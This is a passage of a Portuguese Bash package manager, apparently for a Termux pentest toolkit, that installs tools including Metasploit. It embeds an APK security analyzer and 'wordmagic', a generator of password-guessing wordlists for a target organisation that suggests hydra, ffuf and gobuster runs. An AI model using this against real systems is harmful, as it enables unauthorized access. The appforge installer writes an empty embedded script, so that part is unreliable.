    date "+%Y-%m-%d %H:%M:%S" > "$XPM_INSTALLED/${1}.installed"
}

_mark_removed() {
    rm -f "$XPM_INSTALLED/${1}.installed"
}

# ═══════════════════════════════════════════════════════════════════════════════
# COMANDOS PRINCIPAIS
# ═══════════════════════════════════════════════════════════════════════════════

_install_one() {
    local name="$1"

    _db_exists "$name" || _die "Ferramenta '$name' não encontrada. Use: xpm search $name"

    local desc origin repo termux_ok obs
    desc=$(    _db_get "$name" description)
    origin=$(  _db_get "$name" origin)
    repo=$(    _db_get "$name" repo)
    termux_ok=$(_db_get "$name" termux_ok)
    obs=$(     _db_get "$name" obs)

    _head "Instalando $name"
    _info "$desc"

    # Verifica compatibilidade com Termux
    if _is_termux; then
        case "$termux_ok" in
            no)
                _err "Incompatível com Termux/Android."
                [ -n "$obs" ] && _warn "$obs"
                exit 1
                ;;
            partial)
                _warn "Suporte parcial no Termux."
                [ -n "$obs" ] && _warn "$obs"
                printf "  Continuar mesmo assim? [s/N] "
                read -r ans
                [ "$ans" = "s" ] || [ "$ans" = "S" ] || exit 0
                ;;
        esac
    fi

    [ -n "$obs" ] && _info "Nota: $obs"

    if _is_installed "$name"; then
        _warn "$name já está instalado. Use 'xpm update $name' para atualizar."
        exit 0
    fi

    _dispatch_install "$name" "$origin" "$repo"
    _mark_installed "$name"
    _ok "$name instalado com sucesso!"
}

_dispatch_install() {
    local name="$1" origin="$2" repo="$3"
    case "$origin" in
        apt)    pkg install -y "$repo" 2>/dev/null || _die "Falha ao instalar $repo via pkg" ;;
        pip)    pip3 install --break-system-packages "$repo" 2>/dev/null \
                || pip3 install "$repo" 2>/dev/null \
                || _die "Falha ao instalar $repo via pip" ;;
        go)     _backend_go "$repo" ;;
        cargo)  cargo install "$repo" 2>/dev/null || _die "Falha ao instalar $repo via cargo" ;;
        gem)    gem install "$repo" 2>/dev/null || _die "Falha ao instalar $repo via gem" ;;
        npm)    _backend_npm "$repo" ;;
        github) _backend_github "$name" "$repo" ;;
        source) _backend_source "$repo" "$name" ;;
        msf)    _backend_msf ;;
        apktool)   _backend_apktool ;;
        apkfull)   _backend_apkfull ;;
        apkeditor) _backend_apkeditor ;;
        appforge)   _backend_appforge ;;
        apkinspect) _backend_apkinspect ;;
        wordmagic)  _backend_wordmagic ;;
        *)      _die "Backend desconhecido: $origin" ;;
    esac
}



_backend_appforge() {
  local PREFIX="${PREFIX:-/data/data/com.termux/files/usr}"
  local W2A_HOME="$HOME/.xpm/appforge"
  local W2A_JAR="$W2A_HOME/android.jar"
  local W2A_BIN="$PREFIX/bin/appforge"

  printf "\033[1;33m  -> Instalando deps (aapt2 ecj dx apksigner zipalign python)...\033[0m\n"
  printf "\033[1;33m  -> Instalando deps uma por uma...\033[0m\n"
  for _pkg in aapt2 ecj dx apksigner zipalign python; do
    if ! command -v "$_pkg" >/dev/null 2>&1 && ! dpkg -l "$_pkg" >/dev/null 2>&1; then
      printf "\033[0;90m     pkg install %s...\033[0m\n" "$_pkg"
      pkg install -y "$_pkg" 2>/dev/null || printf "\033[1;33m     aviso: $_pkg nao instalado (pode nao estar disponivel)\033[0m\n"
    fi
  done

  if [ ! -f "$W2A_JAR" ]; then
    mkdir -p "$W2A_HOME"
    printf "\033[1;33m  -> Baixando android.jar API 33 (~14MB, unica vez)...\033[0m\n"
    python3 -c "
import urllib.request, zipfile, io, os
url='https://dl.google.com/android/repository/platform-33_r02.zip'
out=os.path.expanduser('$HOME/.xpm/appforge/android.jar')
os.makedirs(os.path.dirname(out),exist_ok=True)
print('  Conectando...',flush=True)
with urllib.request.urlopen(url) as r:
    total=int(r.headers.get('Content-Length',0)); data=bytearray(); done=0
    while True:
        buf=r.read(65536)
        if not buf: break
        data.extend(buf); done+=len(buf)
        if total: print(f'\r  [{done*100//total:3d}%] {done/1048576:.1f}/{total/1048576:.1f}MB',end='',flush=True)
    print()
zf=zipfile.ZipFile(io.BytesIO(bytes(data)))
jar_entry=next((n for n in zf.namelist() if n.endswith('android.jar')),None)
if not jar_entry: print('ERRO: android.jar nao encontrado no zip. Entries:',zf.namelist()[:10]); sys.exit(1)
with zf.open(jar_entry) as s,open(out,'wb') as d: d.write(s.read())
print('  android.jar salvo (' + jar_entry + ')')
" 2>&1 || { printf "\033[1;31m  Falha no download.\033[0m\n"; return 1; }
  else
    printf "\033[1;32m  android.jar ja presente\033[0m\n"
  fi

  printf "\033[1;33m  -> Instalando script appforge...\033[0m\n"
  python3 - "$W2A_BIN" << 'PYEOF'
import sys, os, stat
path = sys.argv[1]
script_b64 = ''
import base64 as _b64
script = _b64.b64decode(script_b64).decode('utf-8')
with open(path, 'w') as f:
    f.write(script)
os.chmod(path, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
print("appforge instalado em " + path)
PYEOF

  chmod +x "$W2A_BIN"
  ln -sf "$W2A_BIN" "${PREFIX:-/data/data/com.termux/files/usr}/bin/af"
  printf "\033[1;32m  appforge instalado em %s\033[0m\n" "$W2A_BIN"
  printf "\n\033[1;33m  Uso:\033[0m appforge build ./meuapp/ --name \"App\" --perm camera,mic\n\n"
}


# ── apkinspect ─────────────────────────────────────────────────────────────
_backend_apkinspect() {
    local PREFIX="${PREFIX:-/data/data/com.termux/files/usr}"
    local BIN="$PREFIX/bin/apkinspect"

    # aapt é muito mais leve que androguard — sem pip, sem compilação Rust
    if ! command -v aapt >/dev/null 2>&1 && ! command -v aapt2 >/dev/null 2>&1; then
        _info "Instalando aapt (necessário para decodificar o manifest)..."
        pkg install -y aapt 2>/dev/null || _warn "aapt não instalado — análise de manifest limitada"
    else
        _ok "aapt disponível: $(command -v aapt 2>/dev/null || command -v aapt2 2>/dev/null)"
    fi

    _info "Instalando script apkinspect..."
    cat > "$BIN" << 'APKINSPECT_EOF'
#!/usr/bin/env python3
# apkinspect — ElliotOS APK Analyzer
# Zero dependências pip — usa aapt + apksigner + Python stdlib (zipfile, re, hashlib)
import sys, os, re, zipfile, subprocess, shutil, hashlib

# ── output helpers ──────────────────────────────────────────────────────────
def _hdr(t):    print(f"\n\033[1;35m── {t} {'─'*(48-len(t))}\033[0m")
def _ok(k,v):   print(f"  \033[1;32m{k:<24}\033[0m {v}")
def _warn(k,v): print(f"  \033[1;33m{k:<24}\033[0m {v}")
def _item(v):   print(f"  \033[0;90m• {v}\033[0m")
def _flag(cond, k, good, bad): (_warn if cond else _ok)(k, bad if cond else good)

def run(*cmd):
    try:
        r = subprocess.run(list(cmd), capture_output=True, text=True, timeout=60)
        return r.stdout + r.stderr
    except Exception: return ""

# ── entry point ─────────────────────────────────────────────────────────────
if len(sys.argv) < 2 or sys.argv[1] in ('-h','--help'):
    print("\n\033[1;35m  apkinspect — ElliotOS APK Analyzer\033[0m")
    print("  Sem dependências pip — usa aapt + apksigner + Python stdlib\n")
    print("  Uso: apkinspect <arquivo.apk>\n")
    sys.exit(0)

apk = sys.argv[1]
if not os.path.isfile(apk):
    print(f"\033[1;31m[✗] Arquivo não encontrado: {apk}\033[0m"); sys.exit(1)

AAPT    = shutil.which('aapt') or shutil.which('aapt2')
APKSIGN = shutil.which('apksigner')

sha256 = hashlib.sha256(open(apk,'rb').read()).hexdigest()
bname  = os.path.basename(apk)
fsize  = os.path.getsize(apk)

print(f"\n\033[1;35m╔══════════════════════════════════════════════════════════╗\033[0m")
print(f"\033[1;35m║  apkinspect — {bname:<42} ║\033[0m")
print(f"\033[1;35m╚══════════════════════════════════════════════════════════╝\033[0m")

# ══════════════════════════════════════════════════════════════════════════════
# 1. aapt dump badging — info básica e permissões
# ══════════════════════════════════════════════════════════════════════════════
badging = run(AAPT, 'dump', 'badging', apk) if AAPT else ""

def _bval(pattern, text, grp=1):
    m = re.search(pattern, text)
    return m.group(grp) if m else "—"

pkg    = _bval(r"package: name='([^']+)'",    badging)
vname  = _bval(r"versionName='([^']+)'",      badging)
vcode  = _bval(r"versionCode='([^']+)'",      badging)
label  = _bval(r"application-label(?:-\w+)?:'([^']+)'", badging)
minsdk = _bval(r"sdkVersion:'([^']+)'",       badging)
tgtsdk = _bval(r"targetSdkVersion:'([^']+)'", badging)

_hdr("INFO GERAL")
_ok("Package:",      pkg)
_ok("App Name:",     label)
_ok("Version Name:", vname)
_ok("Version Code:", vcode)
_ok("Min SDK:",      minsdk)
_ok("Target SDK:",   tgtsdk)
_ok("SHA256:",       sha256)
_ok("Tamanho:",      f"{fsize//1024} KB")
if not AAPT:
    print("  \033[0;90m  (aapt não encontrado — instale apkfull para dados completos)\033[0m")

# ══════════════════════════════════════════════════════════════════════════════
# 2. aapt dump xmltree — manifest decodificado (flags + componentes)
# ══════════════════════════════════════════════════════════════════════════════
xmltree = run(AAPT, 'dump', 'xmltree', apk, 'AndroidManifest.xml') if AAPT else ""

def _bool_attr(name, tree, default=False):
    m = re.search(rf'android:{name}[^=]*=\(type 0x12\)(0x\w+)', tree)
    if m: return m.group(1) == '0x1'
    # também tenta formato sem parênteses: android:debuggable="true"
    m2 = re.search(rf'android:{name}[^=]*="(true|false)"', tree)
    if m2: return m2.group(1) == 'true'
    return default

debuggable = _bool_attr('debuggable', xmltree, False)
bk_m = re.search(r'android:allowBackup[^=]*=\(type 0x12\)(0x\w+)', xmltree)
allow_bk = (bk_m.group(1) == '0x1') if bk_m else True   # padrão = true se ausente
nsc_attr = bool(re.search(r'android:networkSecurityConfig', xmltree))

try:
    with zipfile.ZipFile(apk) as z:
        zlist = z.namelist()
except Exception:
    zlist = []
nsc = nsc_attr or any('network_security_config' in f for f in zlist)

_hdr("FLAGS DE SEGURANÇA")
_flag(debuggable, "Debuggable:",       "false ✓",   "⚠ TRUE — debug remoto possível!")
_flag(allow_bk,   "AllowBackup:",      "false ✓",   "⚠ TRUE — dados via adb backup")
_ok("Net Sec Config:", "✓ presente"   if nsc  else "ausente")

# ══════════════════════════════════════════════════════════════════════════════
# 3. Permissões
# ══════════════════════════════════════════════════════════════════════════════
DANGEROUS = {
    'READ_SMS','SEND_SMS','RECEIVE_SMS','READ_CONTACTS','WRITE_CONTACTS',
    'READ_CALL_LOG','PROCESS_OUTGOING_CALLS','RECORD_AUDIO','CAMERA',
    'ACCESS_FINE_LOCATION','ACCESS_COARSE_LOCATION','READ_EXTERNAL_STORAGE',
    'WRITE_EXTERNAL_STORAGE','MANAGE_EXTERNAL_STORAGE','GET_ACCOUNTS',
    'SYSTEM_ALERT_WINDOW','USE_BIOMETRIC','USE_FINGERPRINT',
    'BIND_ACCESSIBILITY_SERVICE','READ_PHONE_STATE','CALL_PHONE',
}
perms_b = re.findall(r"uses-permission(?:-sdk-\d+)?: name='([^']+)'", badging)
perms_x = re.findall(r'A: android:name[^"]*"(android\.permission\.[^"]+)"', xmltree)
perms   = sorted(set(perms_b + perms_x))

_hdr(f"PERMISSÕES ({len(perms)})")
for p in perms:
    short = p.replace('android.permission.','')
    if any(d in short for d in DANGEROUS): _warn("  ⚠", p)
    else: _item(p)

# ══════════════════════════════════════════════════════════════════════════════
# 4. Componentes
# ══════════════════════════════════════════════════════════════════════════════
def _components(tag, tree):
    items = []
    lines = tree.splitlines()
    for i, line in enumerate(lines):
        if re.search(rf'\bE: {tag}\b', line):
            for j in range(i+1, min(i+8, len(lines))):
                nm = re.search(r'A: android:name[^"]*"([^"]+)"', lines[j])
                if nm: items.append(nm.group(1)); break
                if re.match(r'\s+E: ', lines[j]) and j > i+1: break
    return items

acts  = _components('activity', xmltree)
svcs  = _components('service',  xmltree)
rcvs  = _components('receiver', xmltree)
prvs  = _components('provider', xmltree)
# fallback badging para activities
if not acts:
    acts = re.findall(r"launchable-activity: name='([^']+)'", badging)

for lbl, lst in [("ACTIVITIES",acts),("SERVICES",svcs),("RECEIVERS",rcvs),("PROVIDERS",prvs)]:
    _hdr(f"{lbl} ({len(lst)})")
    for x in lst: _item(x)

# ══════════════════════════════════════════════════════════════════════════════
# 5. Deep Links / URL Schemes
# ══════════════════════════════════════════════════════════════════════════════
schemes = list(set(re.findall(r'android:scheme[^"]*"([^"]+)"', xmltree)))
hosts   = list(set(re.findall(r'android:host[^"]*"([^"]+)"',   xmltree)))
paths   = list(set(re.findall(r'android:path(?:Prefix|Pattern)?[^"]*"([^"]+)"', xmltree)))

if schemes or hosts:
    _hdr("DEEP LINKS / URL SCHEMES")
    for s in schemes: _item(f"scheme:  {s}")
    for h in hosts:   _item(f"host:    {h}")
    for p in paths:   _item(f"path:    {p}")

# ══════════════════════════════════════════════════════════════════════════════
# 6. Strings suspeitas — scan do ZIP (DEX + assets)
# ══════════════════════════════════════════════════════════════════════════════
_hdr("STRINGS SUSPEITAS")

TEXT_EXT = ('.js','.json','.xml','.html','.htm','.properties','.txt',
            '.cfg','.yaml','.yml','.env','.config')

url_re = re.compile(rb'https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&()*+,;=%]{8,120}')
api_re = re.compile(rb'(?i)(?:api[_\-]?key|token|secret|passwd?|password|credential)["\']?\s*[:=]\s*["\']?([A-Za-z0-9/_\-+.]{10,60})')
ip_re  = re.compile(rb'\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)(?::\d{2,5})?\b')
ep_re  = re.compile(rb'(?i)(?:/api/|/v\d+/|/rest/|/graphql)[a-zA-Z0-9/_\-?=&.]{3,80}')
ascii_re = re.compile(rb'[ -~]{6,}')   # extrai strings legíveis de DEX binário

NOISE_URLS = ('schemas.android.com','xmlpull.org','www.w3.org','apache.org',
              'google.com/intl','play.google.com/about','goo.gl/YCi','ietf.org')

urls,apis,ips,eps = set(),set(),set(),set()

try:
    with zipfile.ZipFile(apk) as z:
        for name in z.namelist():
            try:
                raw = z.read(name)
                if name.endswith('.dex'):
                    data = b'\n'.join(m.group() for m in ascii_re.finditer(raw))
                elif any(name.lower().endswith(e) for e in TEXT_EXT):
                    data = raw
                else:
                    continue
                for m in url_re.findall(data):
                    u = m.decode('utf-8','replace')
                    if not any(n in u for n in NOISE_URLS): urls.add(u)
                for m in api_re.findall(data):
                    apis.add(m.decode('utf-8','replace')[:50])
                for m in ip_re.findall(data):
                    ip = m.decode('utf-8','replace')
                    if not ip.startswith(('127.','10.','0.','192.168.','172.','255.')):
                        ips.add(ip)
                for m in ep_re.findall(data):
                    eps.add(m.decode('utf-8','replace')[:80])
            except Exception: pass
except Exception as e:
    _item(f"Erro ao ler APK como ZIP: {e}")

if urls:
    print(f"  \033[1;36mURLs ({len(urls)}):\033[0m")
    for u in sorted(urls)[:30]: _item(u)
if eps:
    print(f"\n  \033[1;36mEndpoints ({len(eps)}):\033[0m")
    for e in sorted(eps)[:20]: _item(e)
if ips:
    print(f"\n  \033[1;36mIPs externos ({len(ips)}):\033[0m")
    for ip in sorted(ips): _item(ip)
if apis:
    print(f"\n  \033[1;33m⚠ Possíveis chaves/tokens ({len(apis)}):\033[0m")
    for ak in sorted(apis): _warn("  !", ak)
if not (urls or eps or ips or apis):
    _item("Nenhuma string suspeita encontrada.")

# ══════════════════════════════════════════════════════════════════════════════
# 7. Certificado
# ══════════════════════════════════════════════════════════════════════════════
_hdr("CERTIFICADO")

if APKSIGN:
    cert_out = run(APKSIGN, 'verify', '--print-certs', apk)
    printed = False
    for line in cert_out.splitlines():
        line = line.strip()
        if not line or 'WARNING' in line or line.startswith('Verifies'): continue
        k, _, v = line.partition(':')
        _ok(k.strip()+':', v.strip()) if v else _item(line)
        printed = True
    if not printed: _item("apksigner não retornou certificado (APK pode não estar assinado).")
else:
    # fallback: lê META-INF/*.RSA/.DSA e extrai strings ASN.1 legíveis
    try:
        with zipfile.ZipFile(apk) as z:
            cf = [n for n in z.namelist() if re.match(r'META-INF/.*\.(RSA|DSA|EC)$',n,re.I)]
            if cf:
                raw = z.read(cf[0])
                hits = [s.decode('ascii','replace') for s in re.findall(rb'[ -~]{5,}', raw)
                        if any(k in s.decode('ascii','replace') for k in [b'CN=',b'O=',b'C=',b'OU='])]
                for h in hits: _item(h)
                _item(f"(instale apksigner para detalhes completos)")
            else:
                _item("Nenhum arquivo de assinatura em META-INF/")
    except Exception as ex:
        _item(f"Erro ao ler certificado: {ex}")

print()
APKINSPECT_EOF

    chmod +x "$BIN"
    _ok "apkinspect instalado em $BIN"
    printf "\n  \033[1;33mUso:\033[0m apkinspect app.apk\n\n"
}

# ── wordmagic ──────────────────────────────────────────────────────────────
_backend_wordmagic() {
    local PREFIX="${PREFIX:-/data/data/com.termux/files/usr}"
    local BIN="$PREFIX/bin/wordmagic"

    _info "Instalando script wordmagic..."
    cat > "$BIN" << 'WORDMAGIC_EOF'
#!/usr/bin/env python3
# wordmagic — ElliotOS Smart Wordlist Generator
import sys, os, re, itertools
from datetime import datetime

HELP = """
\033[1;35m  wordmagic — ElliotOS Wordlist Generator\033[0m

  \033[1;32mUso:\033[0m
    wordmagic <alvo>                  Gera wordlist para domínio ou empresa
    wordmagic <alvo> -o out.txt       Salva em arquivo
    wordmagic <alvo> --full           Inclui variações mais longas/combinadas
    wordmagic <alvo> --min 6          Tamanho mínimo (padrão: 4)
    wordmagic <alvo> --max 20         Tamanho máximo (padrão: 18)

  \033[1;32mExemplos:\033[0m
    wordmagic empresa.com
    wordmagic "Empresa SA" -o words.txt --full
    wordmagic target.com.br --min 8 -o fuzz.txt

  \033[0;90mFontes: nome, siglas, anos, cidades BR, sufixos comuns,
  prefixos de serviço, leet speak e combinações.\033[0m
"""

if len(sys.argv) < 2 or sys.argv[1] in ('-h','--help'):
    print(HELP); sys.exit(0)

target = sys.argv[1]
out_file = None; full_mode = False; min_len = 4; max_len = 18
i = 2
while i < len(sys.argv):
    arg = sys.argv[i]
    if arg in ('-o','--output') and i+1 < len(sys.argv):
        out_file = sys.argv[i+1]; i += 2
    elif arg == '--full':
        full_mode = True; i += 1
    elif arg == '--min' and i+1 < len(sys.argv):
        min_len = int(sys.argv[i+1]); i += 2
    elif arg == '--max' and i+1 < len(sys.argv):
        max_len = int(sys.argv[i+1]); i += 2
    else: i += 1

raw = re.sub(r'(?i)(https?://)?(www\.)?', '', target).lower()
raw_clean = raw.split('/')[0]
parts = [p for p in re.split(r'[\.\-_\s]+', raw_clean)
         if p and p not in ('com','net','org','io','br','co','edu','gov','www','app','dev','')]
name = parts[0] if parts else raw_clean.replace('.','')

print(f"\n\033[1;35m╔══════════════════════════════════════════════════════════╗\033[0m")
print(f"\033[1;35m║  wordmagic — alvo: {target:<38} ║\033[0m")
print(f"\033[1;35m╚══════════════════════════════════════════════════════════╝\033[0m")
print(f"  \033[0;90m→ Nome: '{name}'  |  Partes: {parts}  |  Modo full: {full_mode}\033[0m")

words = set()
bases = set()
for p in parts:
    for v in [p, p.capitalize(), p.upper()]: bases.add(v)
if len(parts) > 1:
    sigla = ''.join(x[0] for x in parts if x)
    for v in [sigla, sigla.upper(), sigla.capitalize()]: bases.add(v)
full_name = ''.join(parts)
for v in [full_name, full_name.capitalize()]: bases.add(v)

cy = datetime.now().year
years = [str(y) for y in range(2000, cy+2)]
years2 = [y[-2:] for y in years]
recent_y = years[-6:]; recent_y2 = years2[-6:]

cities = ['sp','rj','bh','df','cwb','poa','rec','for','man','bel',
          'saopaulo','riodejaneiro','brasilia','curitiba','portoalegre',
          'recife','fortaleza','manaus','belem','salvador','campinas',
          'goiania','natal','maceio','teresina','floripa','florianopolis']

suffixes = ['123','1234','12345','321','!','@','#','01','02','10','20',
            'admin','adm','user','login','pass','senha','master','root',
            'secret','key','api','dev','prod','test','hom','staging',
            'backup','tmp','old','new',
            '2023','2024','2025','2023!','2024!','2025!','@2024','@2025','#1']

prefixes = ['admin','adm','user','login','ftp','ssh','mail','smtp',
            'vpn','db','backup','test','dev','api','portal','intranet',
            'srv','ws','app','mobile','web','www','cdn','static']

leet = str.maketrans('aeiostlb','43105718')

for b in bases:
    words.add(b)
    words.add(b.lower())
    words.add(b.lower().translate(leet))
    for y in recent_y:
        for sep in ['','_','-','@']:
            words.add(f"{b.lower()}{sep}{y}")
            words.add(f"{b}{sep}{y}")
    for y in recent_y2:
        words.add(f"{b.lower()}{y}")
    for s in suffixes:
        words.add(f"{b.lower()}{s}")
        words.add(f"{b}{s}")
    for p in prefixes:
        words.add(f"{p}{b.lower()}")
        words.add(f"{p}_{b.lower()}")
    for c in cities[:10]:
        words.add(f"{b.lower()}{c}")

if full_mode:
    if len(parts) >= 2:
        for p1,p2 in itertools.permutations(parts[:4],2):
            for sep in ['','_','-']:
                words.add(f"{p1}{sep}{p2}")
                words.add(f"{p1}{sep}{p2}123")
                words.add(f"{p1}{sep}{p2}2024")
                words.add(f"{p1}{sep}{p2}!")
    for b in list(bases)[:5]:
        for y in recent_y:
            words.add(f"{b.lower().translate(leet)}{y}")
        for s in suffixes[:15]:
            words.add(f"{b.lower().translate(leet)}{s}")
    for c in cities:
        for b in list(bases)[:3]:
            words.add(f"{b.lower()}{c}")
            words.add(f"{c}{b.lower()}")

words = {w for w in words if min_len <= len(w) <= max_len and w.strip()}
word_list = sorted(words)

print(f"  \033[1;32m✓ {len(word_list)} palavras geradas\033[0m")

if out_file:
    with open(out_file,'w') as f:
        f.write('\n'.join(word_list)+'\n')
    print(f"  \033[1;32m✓ Salvo em: {out_file}\033[0m")
    print(f"  \033[0;90m→ ffuf  -u https://alvo.com/FUZZ -w {out_file}\033[0m")
    print(f"  \033[0;90m→ gobuster dir -u https://alvo.com -w {out_file}\033[0m")
    print(f"  \033[0;90m→ hydra ... -P {out_file}\033[0m")
else:
    for w in word_list: print(w)
print()
WORDMAGIC_EOF

    chmod +x "$BIN"
    _ok "wordmagic instalado em $BIN"
    printf "\n  \033[1;33mUso:\033[0m wordmagic empresa.com [-o words.txt] [--full]\n\n"
}

cmd_install() {
    local names=("$@")
    [ "${#names[@]}" -eq 0 ] && { _err "Uso: xpm install <ferramenta> [ferramenta2] [ferramenta3 ...]"; exit 1; }

    local total="${#names[@]}" ok=0 fail=0 failed_names="" name

    [ "$total" -gt 1 ] && _head "Instalando $total ferramentas: ${names[*]}"

    for name in "${names[@]}"; do
        if ( _install_one "$name" ); then
            ok=$((ok + 1))
        else
            fail=$((fail + 1))
            failed_names="$failed_names $name"
            _err "Falha ao instalar '$name' — seguindo para a próxima"
        fi
    done

    if [ "$total" -gt 1 ]; then
        printf "\n"
        _head "Resumo da instalação em lote"
        _ok "$ok de $total instalada(s) com sucesso"
        [ "$fail" -gt 0 ] && _err "$fail falharam:$failed_names"
    fi

    [ "$fail" -gt 0 ] && [ "$ok" -eq 0 ] && exit 1
    return 0
}

_remove_one() {
    local name="$1"
    _is_installed "$name" || { _warn "$name não está instalado."; return 0; }

    local origin repo
    origin=$(_db_get "$name" origin)
    repo=$(  _db_get "$name" repo)

    _head "Removendo $name"

    case "$origin" in
        apt)
            pkg uninstall -y "$repo" 2>/dev/null || apt-get remove -y "$repo" 2>/dev/null || true
            ;;
        pip)
            pip3 uninstall -y "$name" 2>/dev/null || true
            ;;
        go)
            local bin="${GOPATH:-$HOME/go}/bin/$(basename $repo)"
            rm -f "$bin" 2>/dev/null || true
            ;;
        cargo)
            cargo uninstall "$name" 2>/dev/null || true
            ;;
        gem)
            gem uninstall -x "$name" 2>/dev/null || true
            ;;
        github|source)
            rm -rf "$HOME/.xpm/tools/$name" 2>/dev/null || true
            rm -f "${PREFIX:-/data/data/com.termux/files/usr}/bin/$name" 2>/dev/null || true
            ;;
        npm)
            npm uninstall -g "$repo" 2>/dev/null || true
            ;;
        msf)
            local BPFX="${PREFIX:-/data/data/com.termux/files/usr}"
            rm -rf "$HOME/.xpm/tools/metasploit" 2>/dev/null || true
            rm -rf "$HOME/.xpm/gems/metasploit"  2>/dev/null || true
            for b in msfconsole msfvenom msfdb msfrpc msfrpcd; do
                rm -f "$BPFX/bin/$b" 2>/dev/null || true
            done
            ;;
        apktool)
            rm -rf "$HOME/.xpm/tools/apktool" 2>/dev/null || true
            pkg remove -y apktool 2>/dev/null || true
            ;;
        apkfull)
            # pkg packages
            pkg remove -y apksigner aapt aapt2 apkeep apkeditor 2>/dev/null || true
            # wrapper anti-idsig: remove o apksigner.real residual
            rm -f  "${PREFIX:-/data/data/com.termux/files/usr}/bin/apksigner.real" 2>/dev/null || true
            # apkeditor via tur-repo ou JAR manual
            rm -f  "${PREFIX:-/data/data/com.termux/files/usr}/bin/apkeditor" 2>/dev/null || true
            rm -rf "$HOME/.xpm/tools/apkeditor" 2>/dev/null || true
            # appforge
            rm -f  "${PREFIX:-/data/data/com.termux/files/usr}/bin/appforge" 2>/dev/null || true
            rm -f  "${PREFIX:-/data/data/com.termux/files/usr}/bin/af" 2>/dev/null || true
            rm -rf "$HOME/.xpm/tools/appforge" 2>/dev/null || true
            # apkinspect
            rm -f  "${PREFIX:-/data/data/com.termux/files/usr}/bin/apkinspect" 2>/dev/null || true
            # keystore de teste
            rm -rf "$HOME/.xpm/tools/apktool" 2>/dev/null || true
            ;;
        apkeditor)
            pkg remove -y apkeditor 2>/dev/null || true
            rm -f  "${PREFIX:-/data/data/com.termux/files/usr}/bin/apkeditor" 2>/dev/null || true
            rm -rf "$HOME/.xpm/tools/apkeditor" 2>/dev/null || true
            ;;
    esac

    _mark_removed "$name"
    _ok "$name removido."
}

cmd_remove() {
    local names=("$@")
    [ "${#names[@]}" -eq 0 ] && { _err "Uso: xpm remove <ferramenta> [ferramenta2 ...]"; exit 1; }

    local total="${#names[@]}" ok=0 fail=0 failed_names="" name

    [ "$total" -gt 1 ] && _head "Removendo $total ferramentas: ${names[*]}"

    for name in "${names[@]}"; do
        if ( _remove_one "$name" ); then
            ok=$((ok + 1))
        else
            fail=$((fail + 1))
            failed_names="$failed_names $name"
            _err "Falha ao remover '$name' — seguindo para a próxima"
        fi
    done

    if [ "$total" -gt 1 ]; then
        printf "\n"
        _head "Resumo da remoção em lote"
        _ok "$ok de $total removida(s) com sucesso"
        [ "$fail" -gt 0 ] && _err "$fail falharam:$failed_names"
    fi

    [ "$fail" -gt 0 ] && [ "$ok" -eq 0 ] && exit 1
    return 0
}

_update_one() {
    local name="$1"
    _is_installed "$name" || { _warn "$name não está instalado. Use: xpm install $name"; return 1; }

    local origin repo
    origin=$(_db_get "$name" origin)
    repo=$(  _db_get "$name" repo)

    _head "Atualizando $name"

    case "$origin" in
        apt)    pkg upgrade -y "$repo" 2>/dev/null || true ;;
        pip)    pip3 install --upgrade "$name" 2>/dev/null || true ;;
        go)     _backend_go "$repo" ;;
        cargo)  cargo install "$name" --force 2>/dev/null || true ;;
        gem)    gem update "$name" 2>/dev/null || true ;;
        source)
            _remove_one "$name"
            _install_one "$name"
            ;;
        github)
            local dest="$HOME/.xpm/tools/$name"
            if [ -d "$dest/.git" ]; then
                git -C "$dest" pull 2>/dev/null || true
                [ -f "$dest/requirements.txt" ] && pip3 install -r "$dest/requirements.txt" 2>/dev/null || true
                # Reaplica a poda docs/spec/test/.github do metasploit depois
                # do pull — com sparse-checkout ativo isso normalmente é um
                # no-op, mas cobre instalações antigas sem sparse-checkout
                # onde o pull pode ter restaurado os diretórios removidos.
                [ "$name" = "metasploit" ] && _msf_optimize_files "$dest"
            else
                _remove_one "$name"
                _install_one "$name"
            fi
            ;;
        npm)    npm update -g "$repo" 2>/dev/null || true ;;
        apktool)
            _remove_one "$name"
            _install_one "$name"
            ;;
        apkfull)
            _remove_one "$name"
            _install_one "$name"
            ;;
    esac

    _ok "$name atualizado."
}

cmd_update() {
    local names=("$@")
    [ "${#names[@]}" -eq 0 ] && { _err "Uso: xpm update <ferramenta> [ferramenta2 ...]"; exit 1; }

    local total="${#names[@]}" ok=0 fail=0 failed_names="" name

    [ "$total" -gt 1 ] && _head "Atualizando $total ferramentas: ${names[*]}"

    for name in "${names[@]}"; do
        if ( _update_one "$name" ); then
            ok=$((ok + 1))
        else
            fail=$((fail + 1))
            failed_names="$failed_names $name"
            _err "Falha ao atualizar '$name' — seguindo para a próxima"
        fi
    done

    if [ "$total" -gt 1 ]; then
        printf "\n"
        _head "Resumo da atualização em lote"
        _ok "$ok de $total atualizada(s) com sucesso"
        [ "$fail" -gt 0 ] && _err "$fail falharam:$failed_names"
    fi

    [ "$fail" -gt 0 ] && [ "$ok" -eq 0 ] && exit 1
    return 0
}

cmd_upgrade() {
    _head "Atualizando todas as ferramentas instaladas"
    local count=0
    for f in "$XPM_INSTALLED"/*.installed; do
        [ -f "$f" ] || continue
        local n
        n=$(basename "$f" .installed)
        _info "Atualizando $n..."
        cmd_update "$n" 2>/dev/null || _warn "Falha ao atualizar $n"
        count=$((count+1))
    done
    [ "$count" -eq 0 ] && _warn "Nenhuma ferramenta instalada."
    _ok "Upgrade concluído ($count ferramentas processadas)."
}

cmd_list() {
    _head "Ferramentas instaladas"
    local count=0
    for f in "$XPM_INSTALLED"/*.installed; do
        [ -f "$f" ] || continue
        local n
        n=$(basename "$f" .installed)
        local cat desc
        cat=$(  _db_get "$n" category  2>/dev/null || echo "?")
        desc=$( _db_get "$n" description 2>/dev/null || echo "")
        local eo_mark=""
        grep -q "^builtin=yes" "$XPM_DB/${n}.tool" 2>/dev/null && eo_mark=" ${M}[★ ElliotOS]${R}"
        printf "  ${G}%-20s${R} ${DIM}%-22s${R} %s%s\n" "$n" "[$cat]" "$desc" "$eo_mark"
        count=$((count+1))
    done
    [ "$count" -eq 0 ] && _warn "Nenhuma ferramenta instalada ainda."
    printf "\n  ${DIM}Total: $count ferramenta(s)${R}\n"
}

cmd_search() {
    local term="$1"
    [ -z "$term" ] && { _err "Uso: xpm search <termo> (ou: xpm search list para ver tudo)"; exit 1; }

    if [ "$term" = "list" ]; then
        _head "Catálogo completo — todas as ferramentas do XPM"
        local count=0 cur_cat="" cat
